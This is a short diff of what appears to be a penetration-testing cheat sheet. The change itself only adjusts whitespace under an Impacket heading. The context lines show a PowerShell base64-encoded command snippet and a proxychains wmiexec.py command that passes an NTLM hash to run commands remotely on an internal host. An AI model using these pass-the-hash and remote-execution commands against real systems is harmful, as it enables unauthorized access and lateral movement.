@@ -324,8 +324,7 @@ $encodedcommand = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($s
 echo $encodedcommand
 ```
 
-##### Impacket 
-
+##### Impacket
 Impacket is a collection of Python classes for working with network protocols
 ```cpp
 proxychains python3 /usr/share/doc/python3-impacket/examples/wmiexec.py -hashes e353da88f9c4331504f70d471f0f9cb1:REDACTED a.user@10.10.120.1
